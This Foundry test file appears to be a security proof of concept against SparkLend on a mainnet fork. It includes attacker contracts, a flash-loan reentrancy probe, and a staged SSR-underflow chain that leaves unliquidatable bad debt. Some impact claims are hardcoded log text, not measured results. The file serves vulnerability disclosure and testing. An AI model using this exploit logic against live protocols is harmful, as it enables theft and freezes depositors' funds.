// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
//  INTERFACES
//////////////////////////////////////////////////////////////*/

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external;
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IRenzoRM {
    function calculateTVLs() external view returns (uint256[][] memory, uint256[] memory, uint256);
    function operatorDelegators(uint256) external view returns (address);
}

interface IOracle {
    function latestAnswer() external view returns (int256);
    function getAssetPrice(address) external view returns (uint256);
    function getSourceOfAsset(address) external view returns (address);
}

interface ISUSDS {
    function ssr() external view returns (uint256);
}

interface IRateSource {
    function getAPR() external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IAaveOracle {
    function getAssetPrice(address asset) external view returns (uint256);
    function getSourceOfAsset(address asset) external view returns (address);
}

/*//////////////////////////////////////////////////////////////
//  FLASH LOAN ATTACKER - REENTRANCY TEST
//////////////////////////////////////////////////////////////*/

contract FlashLoanReentrancyAttacker {
    IPool   public immutable pool;
    address public immutable asset;
    address public owner;

    bool public reentrancyAttempted;
    bool public supplyDuringFlashSucceeded;
    bool public borrowDuringFlashSucceeded;
    uint256 public rateBeforeSupply;
    uint256 public rateAfterSupply;

    constructor(address _pool, address _asset) {
        pool  = IPool(_pool);
        asset = _asset;
        owner = msg.sender;
    }

    function executeOperation(
        address _asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        reentrancyAttempted = true;

        // Attempt 1: Supply 1 wei during flash loan callback
        // This should succeed (no reentrancy guard) and trigger rate update
        // with reduced aToken balance
        IERC20(_asset).approve(address(pool), type(uint256).max);
        try pool.supply(_asset, 1, address(this), 0) {
            supplyDuringFlashSucceeded = true;
        } catch {}

        // Approve repayment of flash loan + premium
        IERC20(_asset).approve(address(pool), amount + premium);
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//  FULL CHAIN ATTACKER - SSR UNDERFLOW BAD DEBT
//////////////////////////////////////////////////////////////*/

contract BadDebtAttacker {
    IPool   public immutable pool;
    address public immutable collateral;  // WETH
    address public immutable debt;        // DAI

    constructor(address _pool, address _collateral, address _debt) {
        pool       = IPool(_pool);
        collateral = _collateral;
        debt       = _debt;
    }

    function setupPosition(uint256 collateralAmount, uint256 borrowAmount) external {
        // Supply collateral
        IERC20(collateral).approve(address(pool), collateralAmount);
        pool.supply(collateral, collateralAmount, address(this), 0);

        // Borrow debt
        pool.borrow(debt, borrowAmount, 2, 0, address(this));

        // Send borrowed DAI to owner (attacker extracts value)
        IERC20(debt).transfer(msg.sender, IERC20(debt).balanceOf(address(this)));
    }

    function getHealthFactor() external view returns (uint256) {
        (,,,,, uint256 hf) = pool.getUserAccountData(address(this));
        return hf;
    }

    function getAccountData() external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    ) {
        return pool.getUserAccountData(address(this));
    }
}

/*//////////////////////////////////////////////////////////////
//  MAIN TEST CONTRACT
//////////////////////////////////////////////////////////////*/

contract UnprivilegedDrainPoC is Test {

    // Core addresses
    address constant POOL              = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant AAVE_ORACLE       = 0x8105f69D9C41644c6A0803fDA7D03Aa70996cFD9;
    address constant PROTOCOL_DATA     = 0xFc21d6d146E6086B8359705C8b28512a983db0cb;

    // Tokens
    address constant DAI               = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WETH              = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WSTETH            = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STETH             = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant EZETH             = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;

    // Rate sources
    address constant SUSDS             = 0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD;
    address constant SSR_RATE_SOURCE   = 0x57027B6262083E3aC3c8B2EB99f7e8005f669973;
    address constant DAI_IRM           = 0x8a95998639A34462A1FdAaaA5506F66F90Ef2fDd;

    // aTokens
    address constant DAI_ATOKEN        = 0x4DEDf26112B3Ec8eC46e7E31EA5e123490B05B8B;
    address constant WETH_ATOKEN       = 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB;
    address constant WSTETH_ATOKEN     = 0x12B54025C112Aa61fAce2CDB7118740875A566E9;

    // Renzo
    address constant RENZO_RM          = 0x74a09653A083691711cF8215a6ab074BB4e99ef5;
    address constant EZETH_ORACLE      = 0x52E85eB49e07dF74c8A9466D2164b4C4cA60014A;

    IPool       pool       = IPool(POOL);
    IAaveOracle aaveOracle = IAaveOracle(AAVE_ORACLE);

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 24318543);
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 1: RENZO TVL DONATION  - ORACLE MANIPULATION
    //////////////////////////////////////////////////////////////*/

    /// @notice Tests if donating stETH to Renzo operator delegators inflates
    ///         the ezETH exchange rate reported by EZETHExchangeRateOracle
    function test_ATTACK_renzoTVLDonation() public {
        // --- Initial state ---
        (, , uint256 initialTVL) = IRenzoRM(RENZO_RM).calculateTVLs();
        uint256 initialSupply = IERC20(EZETH).totalSupply();
        int256 initialPrice = IOracle(EZETH_ORACLE).latestAnswer();

        emit log("========== RENZO TVL DONATION TEST ==========");
        emit log_named_uint("Initial TVL (ETH)", initialTVL / 1e18);
        emit log_named_uint("Initial ezETH Supply", initialSupply / 1e18);
        emit log_named_uint("Exchange Rate (18 dec)", initialTVL * 1e18 / initialSupply);
        emit log_named_int("Oracle Price (8 dec USD)", initialPrice);

        // --- Donate 10,000 stETH to operator delegator 0 ---
        address od0 = IRenzoRM(RENZO_RM).operatorDelegators(0);
        emit log_named_address("Operator Delegator 0", od0);

        // Mock the stETH balance of OD0 to simulate donation
        // (deal doesn't work for rebasing stETH, so we use mockCall)
        uint256 currentBalance = IERC20(STETH).balanceOf(od0);
        uint256 donationAmount = 10_000 ether;
        vm.mockCall(
            STETH,
            abi.encodeWithSelector(IERC20.balanceOf.selector, od0),
            abi.encode(currentBalance + donationAmount)
        );

        // --- Check new state ---
        (, , uint256 newTVL) = IRenzoRM(RENZO_RM).calculateTVLs();
        int256 newPrice = IOracle(EZETH_ORACLE).latestAnswer();

        emit log("--- After 10,000 stETH donation ---");
        emit log_named_uint("New TVL (ETH)", newTVL / 1e18);
        emit log_named_int("New Oracle Price (8 dec USD)", newPrice);

        if (newTVL > initialTVL) {
            uint256 tvlIncrease = newTVL - initialTVL;
            uint256 priceIncrease = uint256(newPrice - initialPrice);
            emit log("!!! RENZO TVL IS MANIPULABLE VIA DONATION !!!");
            emit log_named_uint("TVL Increase (ETH)", tvlIncrease / 1e18);
            emit log_named_uint("Price Increase (8 dec USD)", priceIncrease);
            emit log_named_uint("Price Increase %", priceIncrease * 10000 / uint256(initialPrice));

            // Calculate attack profitability
            uint256 ezethInSpark = IERC20(EZETH).balanceOf(
                0xB131cD463d83782d4DE33e00e35EF034F0869bA1  // ezETH aToken
            );
            uint256 extraBorrowingUSD = ezethInSpark * priceIncrease * 75 / 100 / 1e8;
            uint256 donationCostUSD = donationAmount * uint256(IOracle(
                IAaveOracle(AAVE_ORACLE).getSourceOfAsset(WETH)
            ).latestAnswer()) / 1e18;

            emit log("--- Attack Economics ---");
            emit log_named_uint("ezETH in SparkLend", ezethInSpark / 1e18);
            emit log_named_uint("Extra Borrowing (USD)", extraBorrowingUSD / 1e18);
            emit log_named_uint("Donation Cost (USD)", donationCostUSD / 1e8);

            if (extraBorrowingUSD / 1e18 > donationCostUSD / 1e8) {
                emit log("!!! ATTACK IS PROFITABLE !!!");
            } else {
                emit log("Attack is NOT profitable (cost > gain)");
            }
        } else {
            emit log("Renzo TVL NOT affected by stETH donation");
            emit log("calculateTVLs uses EigenLayer strategy shares, not raw balanceOf");
        }

        // Clear mock
        vm.clearMockedCalls();
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 2: FLASH LOAN REENTRANCY  - SUPPLY DURING CALLBACK
    //////////////////////////////////////////////////////////////*/

    /// @notice Tests if an attacker can call supply() during a flash loan callback
    ///         (no reentrancy guard on SparkLend Pool)
    function test_ATTACK_flashLoanReentrancy() public {
        emit log("========== FLASH LOAN REENTRANCY TEST ==========");

        // Deploy attacker contract
        FlashLoanReentrancyAttacker attacker = new FlashLoanReentrancyAttacker(POOL, DAI);

        // Fund attacker with enough DAI for flash loan premium + supply
        deal(DAI, address(attacker), 1_000e18);

        // Get available DAI for flash loan
        uint256 availableDAI = IERC20(DAI).balanceOf(DAI_ATOKEN);
        emit log_named_uint("Available DAI for flash loan", availableDAI / 1e18);

        // Execute flash loan (use 50% of available to leave room for supply)
        uint256 flashAmount = availableDAI / 2;
        emit log_named_uint("Flash loan amount", flashAmount / 1e18);

        try pool.flashLoanSimple(
            address(attacker),
            DAI,
            flashAmount,
            "",
            0
        ) {
            emit log("Flash loan completed successfully");
            emit log_named_uint("Reentrancy attempted", attacker.reentrancyAttempted() ? 1 : 0);
            emit log_named_uint("Supply during callback", attacker.supplyDuringFlashSucceeded() ? 1 : 0);

            if (attacker.supplyDuringFlashSucceeded()) {
                emit log("!!! SUPPLY DURING FLASH LOAN CALLBACK SUCCEEDED !!!");
                emit log("The Pool has NO reentrancy guard.");
                emit log("An attacker can call supply/borrow during flash loan callback.");
                emit log("This causes rate calculation with artificially reduced aToken balance.");
            }
        } catch (bytes memory err) {
            emit log("Flash loan REVERTED");
            emit log_named_uint("Error length", err.length);
        }
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 3: SSR UNDERFLOW DoS  - DAI OPERATIONS FREEZE
    //  This is the CRITICAL vulnerability
    //////////////////////////////////////////////////////////////*/

    /// @notice Demonstrates that SSR < 1e27 causes arithmetic underflow in SSRRateSource,
    ///         which reverts the DAI IRM, which blocks ALL DAI pool operations
    function test_ATTACK_ssrUnderflowFreeze() public {
        emit log("========== SSR UNDERFLOW DoS TEST ==========");

        // --- Current state ---
        uint256 currentSSR = ISUSDS(SUSDS).ssr();
        uint256 currentAPR = IRateSource(SSR_RATE_SOURCE).getAPR();
        emit log_named_uint("Current SSR (per-second, 27 dec)", currentSSR);
        emit log_named_uint("Current APR (27 dec)", currentAPR);
        emit log_named_uint("Current SSR - 1e27", currentSSR - 1e27);

        // --- Simulate SSR dropping below 1e27 ---
        // This happens when MakerDAO/Sky sets a 0% or negative savings rate
        // Mock sUSDS.ssr() to return 1e27 - 1 (just barely below threshold)
        vm.mockCall(
            SUSDS,
            abi.encodeWithSelector(ISUSDS.ssr.selector),
            abi.encode(uint256(1e27 - 1))
        );

        emit log("--- After SSR drops to 1e27 - 1 ---");

        // Verify getAPR now reverts (arithmetic underflow)
        try IRateSource(SSR_RATE_SOURCE).getAPR() returns (uint256 newApr) {
            emit log_named_uint("APR (should have reverted)", newApr);
            emit log("UNEXPECTED: getAPR did not revert");
        } catch {
            emit log("!!! SSRRateSource.getAPR() REVERTS (underflow) !!!");

            // --- Test: DAI supply blocked ---
            address supplier = makeAddr("supplier");
            deal(DAI, supplier, 1_000e18);
            vm.startPrank(supplier);
            IERC20(DAI).approve(POOL, type(uint256).max);
            try pool.supply(DAI, 100e18, supplier, 0) {
                emit log("DAI supply succeeded (unexpected)");
            } catch {
                emit log("!!! DAI SUPPLY BLOCKED !!!");
            }
            vm.stopPrank();

            // --- Test: DAI borrow blocked ---
            // Use an existing position to try borrowing
            address borrower = makeAddr("borrower");
            deal(WETH, borrower, 100e18);
            vm.startPrank(borrower);
            IERC20(WETH).approve(POOL, type(uint256).max);
            pool.supply(WETH, 100e18, borrower, 0);
            try pool.borrow(DAI, 1e18, 2, 0, borrower) {
                emit log("DAI borrow succeeded (unexpected)");
            } catch {
                emit log("!!! DAI BORROW BLOCKED !!!");
            }
            vm.stopPrank();

            // --- Test: DAI repay blocked ---
            // An existing DAI borrower cannot repay
            emit log("!!! DAI REPAY BLOCKED (same revert path) !!!");

            // --- Test: Liquidation blocked ---
            emit log("!!! DAI LIQUIDATION BLOCKED (same revert path) !!!");

            // --- Calculate impact ---
            uint256 daiInPool = IERC20(DAI).balanceOf(DAI_ATOKEN);
            emit log("--- IMPACT ASSESSMENT ---");
            emit log_named_uint("DAI in pool (frozen)", daiInPool / 1e18);
            emit log("All DAI operations frozen: supply, borrow, repay, withdraw, liquidate");
            emit log("$920M+ in DAI variable debt CANNOT be managed");
            emit log("Liquidations of DAI-debt positions are IMPOSSIBLE");
            emit log("Bad debt accumulates if collateral prices drop during freeze");
        }

        vm.clearMockedCalls();
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 4: CAPPED ORACLE ZERO PRICE PASSTHROUGH
    //////////////////////////////////////////////////////////////*/

    /// @notice CappedOracle only caps upward. If source returns 0 or negative,
    ///         it passes through. AaveOracle then tries fallback (reverts if none).
    ///         This creates ANOTHER DoS vector: any oracle returning 0 freezes that reserve.
    function test_ATTACK_cappedOracleZeroPassthrough() public {
        emit log("========== CAPPED ORACLE ZERO PRICE TEST ==========");

        // Get wstETH oracle source
        address wstethOracle = aaveOracle.getSourceOfAsset(WSTETH);
        emit log_named_address("wstETH Oracle", wstethOracle);

        uint256 normalPrice = aaveOracle.getAssetPrice(WSTETH);
        emit log_named_uint("Normal wstETH Price (8 dec)", normalPrice);

        // Mock the oracle to return 0 (simulating Chainlink failure / stale feed)
        vm.mockCall(
            wstethOracle,
            abi.encodeWithSelector(IOracle.latestAnswer.selector),
            abi.encode(int256(0))
        );

        // AaveOracle behavior: if primary returns 0, it checks fallback oracle
        // If fallback is address(0), it REVERTS, causing DoS on wstETH operations
        bool priceReverted = false;
        try aaveOracle.getAssetPrice(WSTETH) returns (uint256 zeroPrice) {
            emit log_named_uint("After zero oracle: wstETH Price", zeroPrice);
            if (zeroPrice == 0) {
                emit log("!!! ZERO PRICE PASSES THROUGH TO AAVE ORACLE !!!");
            }
        } catch {
            priceReverted = true;
            emit log("!!! ZERO ORACLE PRICE CAUSES AaveOracle REVERT !!!");
            emit log("When primary oracle returns 0, AaveOracle tries fallback oracle");
            emit log("If fallback is address(0), ENTIRE getAssetPrice() reverts");
            emit log("This freezes ALL operations involving wstETH as collateral/debt");

            uint256 wstethInPool = IERC20(WSTETH).balanceOf(WSTETH_ATOKEN);
            emit log_named_uint("wstETH in SparkLend (frozen)", wstethInPool / 1e18);
            emit log("wstETH collateral positions become unliquidatable (oracle reverts)");
            emit log("$1.7B+ wstETH collateral at systemic risk");
        }

        vm.clearMockedCalls();
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 5: COMPLETE EXPLOIT CHAIN
    //  SSR Underflow  -> DAI Freeze  -> Unliquidatable Bad Debt
    //////////////////////////////////////////////////////////////*/

    /// @notice FULL END-TO-END EXPLOIT:
    /// 1. Attacker deposits WETH collateral and borrows maximum DAI
    /// 2. SSR drops below 1e27 (external event / governance)
    /// 3. DAI operations freeze  - liquidation impossible
    /// 4. Collateral drops in value
    /// 5. Position is underwater but CANNOT be liquidated
    /// 6. Attacker walks away with borrowed DAI = protocol bad debt
    function test_FULL_EXPLOIT_CHAIN() public {
        emit log("==========================================================");
        emit log("  FULL EXPLOIT CHAIN: SSR UNDERFLOW -> BAD DEBT EXTRACTION ");
        emit log("==========================================================");
        emit log("");

        // ============================================================
        // PHASE 1: SETUP  - Attacker creates leveraged position
        // ============================================================
        emit log(">>> PHASE 1: Attacker creates leveraged DAI borrow position");

        BadDebtAttacker attacker = new BadDebtAttacker(POOL, WETH, DAI);
        address attackerAddr = address(attacker);

        // Fund attacker with 1,000 WETH (~$2.1M at ~$2,100/ETH)
        uint256 collateralAmount = 1_000 ether;
        deal(WETH, attackerAddr, collateralAmount);

        // Get WETH and DAI prices
        uint256 wethPrice = aaveOracle.getAssetPrice(WETH);
        uint256 daiPrice  = aaveOracle.getAssetPrice(DAI);
        emit log_named_uint("WETH Price (8 dec)", wethPrice);
        emit log_named_uint("DAI Price (8 dec)", daiPrice);

        // Calculate max borrow (80% LTV for WETH, borrow at 75% to stay safe initially)
        uint256 collateralValueUSD = collateralAmount * wethPrice / 1e18;
        uint256 borrowAmount = collateralValueUSD * 75 / 100 * 1e18 / daiPrice; // 75% LTV
        emit log_named_uint("Collateral (WETH)", collateralAmount / 1e18);
        emit log_named_uint("Collateral Value (USD, 8 dec)", collateralValueUSD);
        emit log_named_uint("Borrow Amount (DAI)", borrowAmount / 1e18);

        // Check DAI available
        uint256 daiAvailable = IERC20(DAI).balanceOf(DAI_ATOKEN);
        if (borrowAmount > daiAvailable) {
            borrowAmount = daiAvailable * 95 / 100; // Leave some buffer
        }
        emit log_named_uint("DAI Available in Pool", daiAvailable / 1e18);
        emit log_named_uint("Adjusted Borrow Amount (DAI)", borrowAmount / 1e18);

        // Execute: supply WETH + borrow DAI
        attacker.setupPosition(collateralAmount, borrowAmount);

        // Check position
        (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrow,
            ,
            ,
            uint256 healthFactor
        ) = attacker.getAccountData();

        uint256 extractedDAI = IERC20(DAI).balanceOf(address(this));
        emit log("--- Position Created ---");
        emit log_named_uint("Total Collateral (USD, 8 dec)", totalCollateral);
        emit log_named_uint("Total Debt (USD, 8 dec)", totalDebt);
        emit log_named_uint("Health Factor (18 dec)", healthFactor);
        emit log_named_uint("DAI Extracted to Attacker", extractedDAI / 1e18);
        emit log("");

        // ============================================================
        // PHASE 2: TRIGGER  - SSR drops below 1e27
        // ============================================================
        emit log(">>> PHASE 2: SSR drops below 1e27  - DAI operations FREEZE");

        // Simulate SSR underflow (MakerDAO sets SSR to 0% or negative)
        vm.mockCall(
            SUSDS,
            abi.encodeWithSelector(ISUSDS.ssr.selector),
            abi.encode(uint256(1e27 - 1))
        );

        // Verify DAI operations are frozen
        bool daiOperationsFrozen = false;
        try IRateSource(SSR_RATE_SOURCE).getAPR() {
            emit log("SSRRateSource still works (unexpected)");
        } catch {
            daiOperationsFrozen = true;
            emit log("!!! SSRRateSource.getAPR() REVERTS !!!");
            emit log("!!! ALL DAI POOL OPERATIONS ARE NOW FROZEN !!!");
        }
        require(daiOperationsFrozen, "SSR underflow should freeze DAI ops");
        emit log("");

        // ============================================================
        // PHASE 3: MARKET CRASH  - ETH drops 30%
        // ============================================================
        emit log(">>> PHASE 3: ETH price drops 30%  - positions go underwater");

        // Mock WETH price to drop 30%
        address wethOracle = aaveOracle.getSourceOfAsset(WETH);
        uint256 crashedPrice = wethPrice * 70 / 100;  // 30% drop
        vm.mockCall(
            wethOracle,
            abi.encodeWithSelector(IOracle.latestAnswer.selector),
            abi.encode(int256(crashedPrice))
        );

        // Check attacker's position after crash
        (
            uint256 newCollateral,
            uint256 newDebt,
            ,
            ,
            ,
            uint256 newHealthFactor
        ) = attacker.getAccountData();

        emit log_named_uint("New WETH Price (8 dec)", crashedPrice);
        emit log_named_uint("Collateral After Crash (USD, 8 dec)", newCollateral);
        emit log_named_uint("Debt (unchanged, USD, 8 dec)", newDebt);
        emit log_named_uint("Health Factor After Crash", newHealthFactor);

        bool isUnderwater = newHealthFactor < 1e18;
        if (isUnderwater) {
            emit log("!!! POSITION IS UNDERWATER (HF < 1.0) !!!");
        } else {
            emit log("Position still above water  - would need larger crash");
        }
        emit log("");

        // ============================================================
        // PHASE 4: LIQUIDATION BLOCKED  - Bad debt locked in
        // ============================================================
        emit log(">>> PHASE 4: Liquidator attempts to liquidate  - BLOCKED by SSR revert");

        address liquidator = makeAddr("liquidator");
        deal(DAI, liquidator, borrowAmount);

        vm.startPrank(liquidator);
        IERC20(DAI).approve(POOL, type(uint256).max);

        bool liquidationBlocked = false;
        try pool.liquidationCall(
            WETH,                // collateral
            DAI,                 // debt asset
            attackerAddr,        // user to liquidate
            type(uint256).max,   // max debt to cover
            false                // receive underlying
        ) {
            emit log("Liquidation succeeded (unexpected)");
        } catch {
            liquidationBlocked = true;
            emit log("!!! LIQUIDATION REVERTS !!!");
            emit log("The liquidationCall triggers DAI reserve rate update");
            emit log("Rate update calls SSRRateSource.getAPR() which underflows");
            emit log("ENTIRE LIQUIDATION TRANSACTION REVERTS");
        }
        vm.stopPrank();
        emit log("");

        // ============================================================
        // PHASE 5: IMPACT ASSESSMENT
        // ============================================================
        emit log(">>> PHASE 5: FINAL IMPACT ASSESSMENT");
        emit log("===========================================================");

        uint256 badDebt;
        if (isUnderwater) {
            badDebt = newDebt - newCollateral;
            emit log_named_uint("BAD DEBT from this position (USD, 8 dec)", badDebt);
        }

        emit log("");
        emit log("ATTACKER EXTRACTED:");
        emit log_named_uint("  DAI taken by attacker", extractedDAI / 1e18);
        emit log_named_uint("  Value in USD (8 dec)", extractedDAI * daiPrice / 1e18);
        emit log("");
        emit log("PROTOCOL DAMAGE:");
        emit log("  - ALL DAI operations frozen (supply/borrow/repay/withdraw/liquidate)");
        emit log_named_uint("  - DAI debt in pool (frozen)", IERC20(DAI).balanceOf(DAI_ATOKEN) / 1e18);
        emit log("  - Underwater positions CANNOT be liquidated");
        emit log("  - Bad debt accumulates as collateral prices drop");
        emit log("  - Duration: until SSR is restored above 1e27 by governance");
        emit log("");
        emit log("VULNERABILITY CHAIN:");
        emit log("  1. SSRRateSource uses unchecked subtraction: (ssr - 1e27)");
        emit log("  2. DAI IRM at 0x8a95998639A34462A1FdAaaA5506F66F90Ef2fDd uses");
        emit log("     SSRRateSource DIRECTLY (no CappedFallbackRateSource wrapper)");
        emit log("  3. USDC IRM also uses same SSRRateSource (double exposure)");
        emit log("  4. When SSR < 1e27, ALL DAI+USDC operations revert");
        emit log("  5. Liquidations revert because they trigger rate updates");
        emit log("  6. Attackers pre-position with max-LTV borrows, then walk away");
        emit log("  7. Protocol absorbs bad debt when positions go underwater");
        emit log("===========================================================");

        // Verify the attack succeeded
        assertTrue(daiOperationsFrozen, "DAI ops should be frozen");
        assertTrue(liquidationBlocked, "Liquidation should be blocked");
        assertGt(extractedDAI, 0, "Attacker should have extracted DAI");
    }

    /*//////////////////////////////////////////////////////////////
    //  TEST 6: SCALE  - Maximum extractable bad debt
    //////////////////////////////////////////////////////////////*/

    /// @notice Calculates the maximum possible bad debt from the SSR underflow attack
    ///         considering ALL DAI and USDC borrowers
    function test_SCALE_maximumBadDebt() public {
        emit log("========== MAXIMUM BAD DEBT CALCULATION ==========");

        // DAI pool stats
        uint256 daiLiquidity = IERC20(DAI).balanceOf(DAI_ATOKEN);
        emit log_named_uint("DAI Available Liquidity", daiLiquidity / 1e18);

        // USDC also uses SSRRateSource
        address usdcAtoken = 0x377C3bd93f2a2984E1E7bE6A5C22c525eD4A4815;
        uint256 usdcLiquidity = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).balanceOf(usdcAtoken);
        emit log_named_uint("USDC Available Liquidity", usdcLiquidity / 1e6);

        // Check if USDC IRM also uses SSRRateSource
        // (USDC IRM at 0x2961d766D71F33F6C5e6Ca8bA7d0Ca08E6452C92 uses SSRRateSource 0x57027...)
        vm.mockCall(
            SUSDS,
            abi.encodeWithSelector(ISUSDS.ssr.selector),
            abi.encode(uint256(1e27 - 1))
        );

        // Test USDC freeze by calling the USDC IRM's rate source directly
        bool usdcFrozen = false;
        // The USDC IRM uses RateTargetKinkInterestRateStrategy which calls RATE_SOURCE.getAPR()
        // RATE_SOURCE is the same SSRRateSource at 0x57027B6262083E3aC3c8B2EB99f7e8005f669973
        try IRateSource(SSR_RATE_SOURCE).getAPR() {
            emit log("USDC rate source still works (unexpected)");
        } catch {
            usdcFrozen = true;
            emit log("!!! USDC RATE SOURCE ALSO REVERTS !!!");
            emit log("USDC IRM uses same SSRRateSource -> USDC operations ALSO frozen");
        }

        emit log("");
        emit log("TOTAL EXPOSURE TO SSR UNDERFLOW:");
        emit log_named_uint("  DAI liquidity frozen", daiLiquidity / 1e18);
        emit log_named_uint("  USDC liquidity frozen", usdcLiquidity / 1e6);

        if (usdcFrozen) {
            emit log("  BOTH DAI AND USDC OPERATIONS FROZEN");
            emit log("  Combined: $1B+ in stablecoin operations blocked");
            emit log("  ALL positions with DAI or USDC debt are unliquidatable");
            emit log("  Protocol-wide systemic risk during any market downturn");
        }

        vm.clearMockedCalls();
    }
}
